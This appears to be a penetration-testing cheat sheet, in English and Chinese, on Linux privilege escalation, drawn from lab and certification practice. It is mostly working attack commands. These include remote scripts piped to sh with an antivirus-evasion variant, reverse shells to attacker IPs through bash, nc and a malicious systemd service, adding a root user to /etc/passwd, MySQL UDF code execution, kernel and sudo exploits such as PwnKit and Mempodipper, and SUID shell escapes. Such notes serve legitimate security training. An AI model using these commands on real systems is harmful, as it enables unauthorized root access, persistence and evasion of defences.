# Linux Privilege Escalation


* linux privilegeEscalation -Raj
hackingarticles.in/category/privilege-escalation/
* Linux Privilege Escalation Guide
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* sushant747 Total OSCP Guide - privilege_escalation
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
* 红蓝对抗提权篇之一文看懂提权
https://www.freebuf.com/articles/network/268221.html
* Ignitetechnologies
https://github.com/Ignitetechnologies/Privilege-Escalation
* privilege-escalation -OSCP cheetsheet
https://cheatsheet.haax.fr/linux-systems/privilege-escalation/abusing_sudo_rights/
+ [gtfobins - privesc cmd](https://gtfobins.github.io/)
* Once you've found the patch to escalation click here: https://github.com/Ignitetechnologies/Privilege-Escalation
* 提权的大致过程、思路
> 收集信息
> 处理，处理、分析数据和优先级排序
> Search，找什么、哪里找，exploit
> 适配，定制exploit 进行利用，可能存在无法直接利用的情况
> Try， 不断的尝试
> kernel exploit failed, check if you have tty.

## about stty
+ nineveh htb, video.
```bash
ctrl-z   # back groud the shell? 
stty -a

stty raw -echo

nc -nvlp 4444  # back to shell

stty rows 49 # from the stty -a
stty cols 185 # from the stty -a

ls  # tab and autuseggustion work.
```


## auto enum

### Linpeas

hacktrick, checklist
https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

* interested para
> + -a (all checks) - This will execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using su with the top2000 passwords.
> + -e (extra enumeration) - This will execute enumeration checkes that are avoided by default
> + -s (superfast & stealth) - This will bypass some time consuming checks - Stealth mode (Nothing will be written to disk)
> + -P (Password) - Pass a password that will be used with sudo -l and bruteforcing other users
> + -D (Debug) - Print information about the checks that haven't discovered anything and about the time each check took
> + -d/-p/-i/-t (Local Network Enumeration) - Linpeas can also discover and port-scan local networks

```
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors

# AV bypass
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```

### Lse
+ backup privesc choice.[git](https://github.com/diego-treitos/linux-smart-enumeration)

```bash
# If you see some green yes!, you probably have already some good stuff to work with.
./lse.sh

# If not, you should try the level 1 verbosity with ./lse.sh -l1 and you will see some more information that can be interesting.
./lse.sh -l1

# If that does not help, level 2 will just dump everything you can gather about the service using ./lse.sh -l2. In this case you might find useful to use ./lse.sh -l2 | less -r.
./lse -l2 | less -r

# You can also select what tests to execute by passing the -s parameter. With it you can select specific tests or sections to be executed. For example ./lse.sh -l2 -s usr010,net,pro will execute the test usr010 and all the tests in the sections net and pro.
```

### LinuxPrivChecker.py
+ [git repo](https://github.com/sleventyeleven/linuxprivchecker), [usage](https://www.securitysift.com/download/linuxprivchecker.py)
+ 列出系统、版本、可写文件、exp、错误配置等信息。

```
usage: linuxprivchecker.py [-h] [-s] [-w] [-o OUTFILE]
-h, --help show this help message and exit
-s, --searches Skip time consumming or resource intensive searches
-w, --write Wether to write a log file, can be used with -0 to specify name/location
-o OUTFILE, --outfile OUTFILE The file to write results (needs to be writable for current user)

python linuxprivchecker.py > report.txt
less report.txt

## python3, install via pip

```

### linEnum
https://github.com/rebootuser/LinEnum

```
Example: ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
OPTIONS:
-k Enter keyword
-e Enter export location
-t Include thorough (lengthy) tests
-s Supply current user password to check sudo perms (INSECURE)
-r Enter report name
-h Displays this help text

```

### linux-exploit-suggester
https://github.com/mzet-/linux-exploit-suggester

```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

Usage:
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh --checksec
./linux-exploit-suggester.sh --uname <uname-string>
```

### Highon.coffee Linux Local Enum
Great enumeration script
wget https://highon.coffee/downloads/linux-local-enum.sh

### unix-privesc-check
http://pentestmonkey.net/tools/audit/unix-privesc-check
```
./unix-privesc-check
./unix-privesc-check standard > output.txt
```

### other tools
Linux post exploitation enumeration and exploit checking tools
https://github.com/reider-roque/linpostexp

## mannul enum

```
# fix path
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:

#-user
id
sudo su //切换为root，不携带当前用户env，输入当前用户密码
// /etc/passwd 查看可登录用户，非nologin|false
grep -vE "nologin|false" /etc/passwd

#-host and 系统、内核信息
hostname
uname -a
cat /etc/issue
// cat /etc/*-release
searchsploit linux kernel 3.2 --exclude="(PoC|/dos/"

#-process
ps -aux
ps -aux | grep root //root运行服务

#-network
ip a
ifconfig
/sbin/route
netstat -tulpn
//a list all conn, n no host resolution, -p process name
ss -anp

#-firewall
iptables
/etc/iptables //config file

#-crontab
crontab -l
ls -lah /etc/cron*
cat /etc/crontab

#-install app and patch
dpkg -l
rpm
apt

#-r/w file dir
## world-writeable folders
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

## world-executable folders
find / -perm -o x -type d 2>/dev/null

## world-writeable & executable folder
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

## writable file, filter out the proc dir.
find / -writable -type f -not -path "/proc/*" 2>/dev/null
find / -writable -type f 2>/dev/null | grep -vE "/home|/sys|/proc"

## gourp test file
find / -group test -type f 2>/dev/null

#-unmount disk
cat /etc/fstab //list content of fstab
mount //list all mounted drivers
/bin/lsblk //list all available drivers

#-device drivers and kernel modules
lsmod // list loaded drivers
/sbin/modinfo libata //list additional info about module

#-suid/binaries autoelevate
find / -perm -u=s -type f 2>/dev/null //SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm +2000 -user root -type f -print
find / -perm -1000 -type d 2>/dev/null //Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null //SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null //SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

```

### Users
+ identify the user context
+ current user, is admin?
+ user list, identify potential high-privilege user accout
```
id
whoami

# 在线用户
who
w

# 登录用户
last

# 切换为root，不携带当前用户env，输入当前用户密码
sudo su
sudo su -

# sudo 授权文件
cat /etc/sudoers

# /etc/passwd 查看可登录用户，非nologin|false
# -v, 反相匹配
# -E，正则匹配；
grep -vE "nologin|false" /etc/passwd

# list all users, 关注程序用户如web、mysql等
cat /etc/passwd | cut -d : -f1
cat /etc/passwd | awk -F: '{print $1}'

# list super users
awk -F: '($3=="0") {print}' /etc/passwd
```

### Hostname
+ hostname provide clues about its functional role, web/db/ftp/dc；help us focus our information gathering efforts

```
hostname
```

### systeminfo
+ OS version, Kernel version,
+ installed patch
+ need precise information about the target;
+ mismatched kernel exploit can lead to system instability

```
# 内核版本
uname -a
uname -r # kernel version
uname -m # 架构

# 发行版本，不同系统名字不同，* 匹配
cat /etc/issue
cat /etc/issue.net

cat /etc/*-release
cat /etc/os-release # debian
cat /etc/redhat-release # centos

# proc
cat /proc/version

# /boot
ls /boot

# rpm 软件包查看内核版本
rpm -q kernel # redhat/centos based

# dmesg 显示开机信息，系统故障排错常用
dmesg
dmesg | grep kernel
dmesg | grep version

# search exploit
searchsploit linux kernel 3.2 --exclude="(PoC|/dos/"
```

### Process&Service
+ process running with privileged account
+ have insecure permissions
+ allow to interact with it in unintended ways
+ service settings misconfigured? vulnerable plugins attached
+ pspy to monitor process, [github](https://github.com/DominicBreuker/pspy)

```bash
# -a, all
# -u, user-readable list format
# -x, processes without controlling ttys
ps -aux
ps -aux | grep root //root运行服务
ps -ef

top # 动态查看，查找木马、可疑进程

# installed program and service
la -alh /usr/bin/
ls -alh /sbin # 通常管理程序目录

dpkg -l # debian installed program
rpm -qa # centos

ls -alh /var/cache/apt/archives # debian，apt install cache
ls -alhR /var/cache/yum/ # centos

# service config, /etc/xx.conf
ls -alR /etc/ | awk '$1 ~ /^.*r.*/' # etc下可读的文件
ls -alR /etc/ | awk '$1 ~ /^.*w.*/' # etc下可写n'b的文件

# service list
systemctl list-unit-files # centos 7 以后，debian
systemctl list-unit-files | grep enable # 开机启动的

# pspy 
## print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 

## place watchers recursively in two directories and non-recursively into a third
./pspy64 -r /path/to/first/recursive/dir -r /path/to/second/recursive/dir -d /path/to/the/non-recursive/dir

## disable printing discovered commands but enable file system events
./pspy64 -p=false -f
```

### Network info
+ network interface, routes, open ports
+ if target connected to multiple networks, could be used as a povit
+ investigate port binding on a loopback address
+ privileged program or service listening on the loopback interface
+ listening ports and connection to other users
+ specific virtual interfaces may indicate the existence of virtualization or antivirus software
+
```bash
ip a
ifconfig

# route table
/sbin/route
route -n # numberic, don't resolve names
routel # pretty format
ip -r
arp -a # arp cache table

# network connections
# -a, all
# -t/u, tcp/udp
# -l, list
# -p, process
# -n, numberic
netstat -atulpn

# -n, no host resolution
# -a, all
# -p, process name
ss -anp

# need root privilege
lsof -i
lsof -i :80


# network interface config, DHCP server/DNS server/gateway
cat /etc/network/interfaces # ubuntu, debian
cat /etc/sysconfig/network-scripts/ifcfg-* # centos
cat /etc/sysconfig/network

cat /etc/resolv.conf # dns config
cat /etc/networks # 网络名和网络地址映射

# dns domain name
dnsdomainname # dns name suffix
```

### firewall
+ firewall state, profile, rules
+ remotely access to network service filterd by firewall, access locally via loopback interface
+ inbound and outbound port filtering, which is useful for port for port forwarding and tunneling(pivot to internal network); may expand our attack surface
+ need root; check firewall config file to bypass root

```
# -L, list
# -n, numberic output of addr and port
iptables
iptalbes -L -n # firewall rules
firewall-cmd --state # centos cmd

# firewall config file, read permission
# save and retore to check rules
/etc/iptables # config file
iptables-save
iptables-restore

# centos 7 firewall zone
ls /usr/lib/firewalld/zones/public.xml
firewall-cmd --info-zone=public # 查看public zone配置
```

### Scheduled task
+ system scheduled task misconfitured
+ user-created file which insecure permissions
+ next runtime, last runtime, task to run, schedule type, start time, start date
+ pspy check root process, [github](https://github.com/DominicBreuker/pspy)
+ pspy check, chkrootkit to privesc. htb nineveh

```
crontab -l # user crontab
ls -lah /etc/cron* # 周期性的计划任务，month/week/day/hour
cat /etc/crontab # 系统计划任务文件，root 运行

# pspy
## print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 

## place watchers recursively in two directories and non-recursively into a third
./pspy64 -r /path/to/first/recursive/dir -r /path/to/second/recursive/dir -d /path/to/the/non-recursive/dir

## disable printing discovered commands but enable file system events
./pspy64 -p=false -f
```

### Installed app&patch
+ using the info to search for a matching exploit
+ installed application could be useful to look for pe attacks
+ what app installed, apache/mysql

```
dpkg -l     # debian based
rpm -qa     # redhat based
```

### R/W file&dir
+ scripts and binary file executed under the context of admin/root; overwrite it with milicious file to elevate privilege
+ sensitive file may contains important

```
# find writable dir, check and test other
find / -writable -type d 2>/dev/null # world-writable

# -perm -222, 匹配w任意1个
find / -perm -222 -type d 2>/dev/null # world-writeable folders

# -perm -o w, others has write permissions
find / -perm -o=w -type d 2>/dev/null # world-writeable folders

find / -perm -o=x -type d 2>/dev/null # world-executable folders
find / -perm -o=x -type f 2>/dev/null # world-executable file

# others have x and w permission
find / \( -perm -o=w -perm -o=x \) -type d 2>/dev/null 

# others have x or w permission
find / \( -perm -o=w -o -perm -o=x \) -type d 2>/dev/null 

# filter out /proc/*
find / writable -type f -not -path "/proc/*" 2>/dev/null
```

### Unmounted disk
+ unmounted drives could contains valuable information
+ check the mount permissions

```
# check both
mount
cat /etc/fstab

# list all available disks, might reveal unmounted partitions
/bin/lsblk
```

### Device drivers & kernel modules
+ need to compile a list of drivers and kernel modules that loaded on the target
+ matching vulnerabilities with corresponding exploits

```
lsmod       # enum loaded kernel modules
/sbin/modinfo libata # more info about specific module(libata)
```

### AutoElevate binary
+ interesting OS specific "shortcuts" to privilege escalation
+ suid PE, cp/nano/namp/vi/ls/more/...

```
# -perm -u=s, suid bit set
find / -perm -u=s -type f 2>/dev/null
```

### interesting file/dir
[hacktricks-interesting files](https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files)

```
/etc/profile
/etc/profile.d
/var/www/html
/var/log/auth.log
/var/spool/mail
/var/tmp
/var/backups
/opt
/tmp
/home/
/home/*/.ssh
/home/*/.bash_history
/root/.ssh
```

## Kernel Exploits
一般来说，建议优先考虑其他方式提权，最后在来看kernel；
kernel exploit可能对服务器造成一定影响、甚至宕机；
超过30分钟，不考虑。

* 查看OS、Architecture、Kernel 版本

```
uname -a
cat /proc/version
cat /etc/issue
```

* search exploit

```
site:exploit-db.com kernel version
python linprivchecker.py extended

searchsploit ubuntu 11.10
searchsploit linux kernel | grep -v dos | grep ' 3\.' | grep -i 'root\|privilege\|exploit'
```
### dirtycow
+ dirtycow kernel, [dirtycow.github](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions)
+ dirtycow exp, [dirtycow poc](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
+ Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8; 
+ dirty ninja, https://dirtycow.ninja/
+ First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016

### 常用exp
+ CVE-2010-2959/14814, 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)
+ CVE-2010-3904/15285, Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
+ CVE-2012-0056/18411, Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64); [exp](https://git.zx2c4.com/CVE-2012-0056/about/)


```
# 14814
wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
$ gcc i-can-haz-modharden.c -o i-can-haz-modharden
$ ./i-can-haz-modharden
[+] launching root shell!
# id
uid=0(root) gid=0(root)

# 18411
wget -O exploit.c http://www.exploit-db.com/download/18411
gcc -o mempodipper exploit.c
./mempodipper
```

## root grogram
webserver、database等，root运行，通过web、db服务运行root

```
ps aux

```

### mysql
+ epxloit; [1181](https://www.exploit-db.com/exploits/1181), [1518](https://www.exploit-db.com/exploits/1518)
+ udf exploit; compile the c file to so, load and create udf
  > **UnreallRCd backdoor**. [htb-lame], [unrealircd-3281-backdoored](https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html)
  > **mysql udf**t. able column is null, **change dir, change max allowed packet**. pg-banzai [database guide](https://database.guide/how-the-load_file-function-works-in-mysql/)

```bash
#mysql
select sys_exec('whoami');
select sys_eval('whoami');
```

```bash
# table column is null, error
## ERROR 1126 (HY000): Can't open shared library 'raptor_udf123.so' (errno: 11 /usr/lib/mysql/plugin/raptor_udf123.so: file too short)'
## File not exit or max_allowed_packet; change the dir to copy, eg. /dev/shm
mysql -u root -pEscalateRaftHubris123

 mysql> use mysql;
 mysql> create table foo(line blob);
 mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
 mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor.so';
 mysql> create function do_system returns integer soname 'raptor.so';
 mysql> select * from mysql.func;
 mysql> select do_system('chmod +s /usr/bin/find');

```

### vnc
+ if you have password, port forward and connect.
+ crack password. [vncpwd.git](https://github.com/jeroennijhof/vncpwd.git)

```bash
# vncpwd, creack
git clone https://github.com/jeroennijhof/vncpwd.git
make
./vncpwd ../secret

# ssh port forward and connect
ssh -L 5901:127.0.0.1:5901 -L 5801:127.0.0.1:5801 charix@$tip

vncviewer -passwd ./secret localhost:5901
```

### tmux
+ old tmux versions problem; htb valentine
+ attach the session file

```bash
# list session file
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess

# attach session file
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket

# error: terminal open failed: missing or unsuitable terminal: tmux-256color
## export term
export TERM=xterm

```

## user soft
安装的第三方软件存在漏洞，利用漏洞提权

```
#常见的用户安装soft目录
/usr/local
/usr/local/src
/opt
/home
/var/
/usr/src
```

## passwd/key
弱密码、明文密码等
* web服务配置文件，可能包含db密码、web密码等（config.php)
* db admin密码可能多处使用
* 弱密码
* 明文密码

```
./LinEnum.sh -t -k password

## find the file contains password.
grep -r password ./

## find the string start with 'password'
grep -E ^password /usr/share/wordlists/rockyou.txt


```

ssh auth key
查看 authorized_keys， 查找是否已泄露密钥[g0tmi1k](https://github.com/g0tmi1k/debian-ssh)，获取私钥后登陆
参考[htb-lame]

```
cat /root/.ssh
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable

grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== *.pub

ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@$tip
```


## Internal/loopback service
+ root运行的内部服务，开发环境server、db之类，可利用漏洞提权
+ mysql run as root, udf


```
netstat -anlpp
netstat -ano
```

## Sudo
> sudo 提权原理
> sudo命令， 某个用户能够以另外某个身份、在哪些主机、执行哪些命令。通俗讲，给普通用户test具有root权限执行某命令（或所有命令），并且不需要root密码。

+ sudoers配置文件, /etc/sudoers, visudo 编辑
+ sudo privesc: mail
+ sudo privesc command, [gtfobins](https://gtfobins.github.io/)
+ sudo version exploit, [sudo exploit](https://github.com/rabiulhsantahin/ctf/blob/main/sudo-exploit.txt)
+ sudo version, <1.28
+ sudo 1.8.31, [Sudo-1.8.31-Root-Exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
+ sudo 1.8.23(centos, ubuntu) [CVE-2021-3156 python exploit](https://github.com/worawit/CVE-2021-3156)

```
User test may run the following commands on ubuntu:
(ALL : ALL) ALL
```
> root表示用户名
> 第一个 ALL 指示允许从任何终端、机器访问sudo
> 第二个 (ALL)指示sudo命令被允许以任何用户身份执行
> 第三个 ALL 表示所有命令都可以作为root执行
sudo提权参考：https://pure.security/how-i-got-root-with-sudo/

```
# sudu 切换user
sudo -u user bash -i

sudo -l

# 切换root
sudo su

# sudo verion 
searchsploit sudo
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"

## <1.28
sudo -u#-1 /bin/bash

## 1.8.31
## https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
## https://github.com/blasty/CVE-2021-3156

# sudo mail
sudo /usr/bin/mail --exec='!/bin/bash'

```

## Suid

### 原理
+ suid guid 提权原理, 以passwd为例，解释SUI、SGID(GUID)作用
+ SUID，设置suid后，普通用户test执行passwd命令修改密码时，以root权限运行passwd，同时修改/etc/passwd、/etc/shadow文件；此时passwd命令有root权限GUID，设置sgid后，只有和root同组用户（即wheel组）执行passwd时拥有root权限。
+ 参考[Linux Privilege Escalation using SUID Binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
+ [linux提权-SUID提权](https://blog.csdn.net/nzjdsds/article/details/84843201)
+ [gtfobins](https://gtfobins.github.io/gtfobins/)
+ common suid command: nmap, vim, find, bash, more, less, nano, cp, pkexec, gcore
+ common method: add user to passwd, copy bash to tmp and add suid, add uesr to sudo group, reverse shell. 
  
```bash
-rwsr-xr-x 1 root root 63960 Feb 7 2020 /usr/bin/passwd
#已设置suid（即属主权限 x位）

# enum suid file.
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

find / -perm -g=s -type f 2>/dev/null

# add user to passwd
openssl passwd evil
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

# copy bash to tmp
cp /bin/bash /tmp/bash
chmod +s /tmp/bash # chmod 4755 /tmp/bash
/tmp/bash -p

# add user to sudo group
usermod -aG sudo admin
sudo su -

# write ssh key to .ssh

```
### nmap-priv

```
#老版本(2.02-5.21）可交互模式运行，允许用户执行shell命令
nmap --interactive
nmap>!sh
#较新版本 --script参数
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
#msf 模块
exploit/unix/local/setuid_nmap
```

### vi/vim

```
sudo vi
:shell

:set shell=/bin/bash:shell
:!bash

:set shell=/bin/sh
:shell

sudo vi -c ‘!sh’

visudo #添加低权限用户
test ALL=(ALL:ALL) ALL
sudo -l
sudo bash
```

### less/more

```
less /etc/passwd
!/bin/sh

more /home/pelle/myfile
!/bin/bash
# 进入后!sh 回车
sudo less /etc/hosts
sudo more /etc/hosts
sudo man ls
```

### nano

```
#修改passwd，增加用户登录
openssl passwd -1 -salt test1 123456
$1$test1$4mkw3HovqvIQpGIJM9AlP/
nano /etc/passwd # 添加用户
test1:$1$test1$4mkw3HovqvIQpGIJM9AlP/:0:0::/root/:/bin/bash
# 获取shadow文件root用户密文进行破解
john passwd

#直接获取shell
nano # 进入编辑器，通过反向shell 获取root shell
Ctrl + R
Ctrl + x
# sudo 可执行nano，但目录受限/var/opt
sudo nano /var/opt/../../etc/sudoers
```

### cp/mv
+ 覆盖passwd文件添加用户;
+ 参考 https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
+ mv同cp类似，覆盖passwd文件，或覆盖 /etc/sudoers

```bash
openssl passwd -1 -salt test1 123456
$1$test1$4mkw3HovqvIQpGIJM9AlP/
cat /etc/passwd > passwd
echo 'test1:$1$test1$4mkw3HovqvIQpGIJM9AlP/:0:0::/root/:/bin/bash' >> passwd
cp passwd /etc/passwd
su test1

#msfvenom 上传backdoor 反向连接
msfvenom -p cmd/nuix/reverse_netcat lhost=[attack ip] lport=1234 R
touch test.sh # 拷贝payload 保存为sh

cp test.sh /etc/cron.hourly/
ls -al /etc/cron.hourly/

nc -lvp 1234
```

### find

```
#1 通过awd获取shell
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;

#2 新建文件 执行命令或 获取shell; check which bash/nc
touch ptlab
find ptlab -exec whoami \;
find ptlab -exec '/bin/sh' \;
find ptlab -exec "/usr/bin/bash" -p  \;    

#3 执行nc 监听端口，攻击机进行连接
find ptlab -exec netcat -lvp 5555 -e /bin/sh \;
netcat [targetip] 5555

#4 执行nc 反弹shell
find ptlab -exec bash -c 'bash -i >& /dev/tcp/[attackip]/4444 0>&1' \;
nc -lvvp 4444

#5 sudo
sudo find / -exec bash -i \;
sudo find /etc/passwd -exec /bin/sh \;
```

### wget
+ wget file to overwrite local file(eg. /etc/passwd)
+ wget read local file.
+ wget https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/

```bash
# overwrite localfile.
wget <url> -O /etc/passwd

# read localfile
wget -i <localfile>
```

### bash/awk/man/wget/tcpdump/ftp/git 

```
bash -p

awk 'BEGIN {system("/bin/sh")}'
sudo awk 'BEGIN {system("/bin/sh")}'

man passwd
!/bin/bash

echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

sudo ftp
ftp> !/bin/bash

sudo git help status
!/bin/bash
```

### python/perl

```
python -c "import os;os.system('/bin/bash')"

sudo python
import os
os.system("/bin/bash")
sudo python -c 'import pty;pty.spawn("/bin/bash")'

sudo perl
exec "/bin/bash";
ctr-d

#sudo 可执行脚本
echo "/bin/bash -i " >> xxx.sh
sudo ./test.sh
```

### cpulimit
+ 提权参考, https://www.hacknos.com/cpulimit-privilege-escalation/

```
#shell
cpulimit -l 100 -f /bin/sh

#suid
cpulimit -l 100 -f -- /bin/sh -p

#sudo
sudo cpulimit -l 100 -f /bin/sh
```

### systemctl
+ add service to get root. htb-jarvis
+ same to sudo reboot; 

```bash
echo "[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.78 9001'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target" > hack2.service

systemctl link /tmp/hack2.service
systemctl start hack2
```

### pkexec
+ [CVE-2021-4034 pwnkit](https://github.com/ly4k/PwnKit)
+ [cve-2021-4034](https://access.redhat.com/security/cve/cve-2021-4034)
+ [python exploit](https://github.com/Almorabea/pkexec-exploit)
+ [Technical Details](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)

```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit
./PwnKit # interactive shell
./PwnKit 'id' # single command

# build
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```

### gcore
+ dump process, get password. eg. ssh, password-store
+ sudo same to suid.
+ pelican

```bash
ps -ef | grep -E "root|password"
gcore -a pid

strings core.xxx

su root
```

### start-stop-daemon
+ pg-sorcerer

```bash
/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p

start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```

### dosbox
+ allows to mount the local file system, so that it can be altered using DOS commands.
+ need graphical interface, not work in the console. notice vnc service/5901

```bash
# local port forwarding, ssh
## local port 5901 to remote 5901
ssh -L 5901:localhost:5901 commander@192.168.120.55

# connect to vnc
vncviewer localhost:5901

# open terminal, and run dosbox
## mount /etc to c
mount c /etc/

## change sudoers, get root;
type user ALL=(ALL) ALL >> sudoers

## or add user to passwd.

```

### viewuser
+ htb-irked, special program.
+ running command as root, check the program with ltrace/strace

```bash
# install lstrace/strace, check the program
lstrace /usr/sbin/viewuser

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.78 9002 >/tmp/f" > /tmp/listusers
```

### setuid
+ C代码root, 通过c语言程序编译生成root身份调用/bin/bash程序，配合提权

```C
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>

int main()
{
setuid(0);
setgid(0);
system("/bin/bash");
return 0;
}
```
编译并执行

```
gcc exp.c -o exp
chmod 777 exp
cpulimit -l 100 -f ./exp
```

## writable script
+ 全局可写script（root用户所有），写入提权payload， run as root
+ 一般可能是定时任务、管理员手动执行触发
+ 可写service文件，配合reboot提权； pg-hetemit

```
#全局可写目录
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

#全局可执行目录
find / -perm -o x -type d 2>/dev/null

#全局可写、执行 目录
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

#msfvenom 生成payload
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R
mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg // copy to scripts

#直接添加
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.3.117 4445 >/tmp/f" >> backups.sh

# pg-hetemit
## sudo reboot, no password.
## /etc/systemd/system/pythonapp.service, write permission.
## search writable file.
